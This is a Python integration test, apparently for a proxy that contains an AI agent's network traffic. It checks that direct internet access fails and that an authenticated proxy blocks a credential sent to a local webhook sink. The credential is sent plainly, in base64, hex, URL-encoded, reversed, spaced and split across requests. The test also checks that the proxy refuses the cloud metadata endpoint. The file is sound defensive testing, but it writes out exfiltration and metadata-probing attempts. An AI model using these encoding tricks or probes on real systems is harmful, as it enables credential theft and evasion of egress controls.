"""Prove containment from a client with only an internal Docker network."""
import json
from pathlib import Path
import os
import socket
import time

import httpx

from leaktest.service import encode


def check(condition, message):
    if not condition:
        raise SystemExit(message)


def main():
    data = json.loads(Path("/test-data/runtime.json").read_text())
    sink = os.environ.get("BURN_SINK_URL", "http://sink:8081")
    for address in (("1.1.1.1", 443), ("sink", 8443)):
        try:
            with socket.create_connection(address, timeout=2):
                pass
        except OSError:
            continue
        raise SystemExit("Direct network access unexpectedly succeeded")
    print("PASS: direct internet and sink access are unavailable.")
    proxy = f"http://{data['agent']}:{data['session']}@proxy:8080"
    for _ in range(60):
        if Path("/certs/mitmproxy-ca-cert.pem").exists():
            break
        time.sleep(0.5)
    with httpx.Client(proxy=proxy, trust_env=False, timeout=5, verify="/certs/mitmproxy-ca-cert.pem") as client:
        for _ in range(60):
            try:
                response = client.get(sink + "/health")
                if response.status_code == 200:
                    break
            except httpx.HTTPError:
                pass
            time.sleep(0.5)
        else:
            raise SystemExit("Authenticated proxy did not become ready")
        benign = "The partner report is complete; no customer action is needed."
        check(client.post(sink + "/webhook", content=benign).status_code == 200, "Benign webhook was blocked")
        for encoding in ("split_across_requests", "plain", "base64", "hex", "url", "reversed", "spaced"):
            blocked = False
            sent = 0
            for payload in encode(data["value"], encoding):
                response = client.post(sink + "/webhook", content=payload)
                sent += 1
                if response.status_code == 403:
                    check(response.json().get("reason") == "credential_detected", "Credential did not reach the exit check")
                    blocked = True
                    break
            check(blocked, "A credential transport reached the webhook")
            if encoding == "split_across_requests":
                check(sent == 2, "Split test did not accumulate evidence across requests")
            check(client.post(sink + "/webhook", content=benign).status_code == 200, "Prior evidence blocked an unrelated request")
            print("PASS: credential blocked using " + encoding + ".")
        response = client.get("http://169.254.169.254/latest/meta-data/")
        check(response.status_code == 403 and response.json()["reason"] == "private_destination", "Metadata was not blocked")
        try:
            client.get("https://169.254.169.254/latest/meta-data/")
        except httpx.ProxyError:
            pass
        else:
            raise SystemExit("HTTPS CONNECT to metadata was not refused")
        print("PASS: metadata is refused for HTTP and HTTPS CONNECT.")
        try:
            client.get("https://example.com/")
        except httpx.ProxyError:
            pass
        else:
            raise SystemExit("Unapproved HTTPS destination was not refused")
        print("PASS: unapproved HTTPS destination refused before connecting.")
    for label, session in data["scoped_sessions"].items():
        scoped_proxy = f"http://{data['agent']}:{session}@proxy:8080"
        with httpx.Client(proxy=scoped_proxy, trust_env=False, timeout=5,
                          verify="/certs/mitmproxy-ca-cert.pem") as client:
            if label == "sink_only":
                check(client.get(sink + "/health").status_code == 200,
                      "Role's explicitly permitted sink was refused")
                response = client.post(sink + "/webhook", content=data["value"])
                check(response.status_code == 403 and response.json()["reason"] == "credential_detected",
                      "Role allowlist bypassed the credential check")
            else:
                try:
                    client.get(sink + "/health")
                except httpx.ProxyError:
                    pass
                else:
                    raise SystemExit("Role-restricted CONNECT unexpectedly reached the sink")
        print("PASS: session destination policy " + label + ".")
    print("PASS: proxy containment integration checks complete.")


if __name__ == "__main__":
    main()
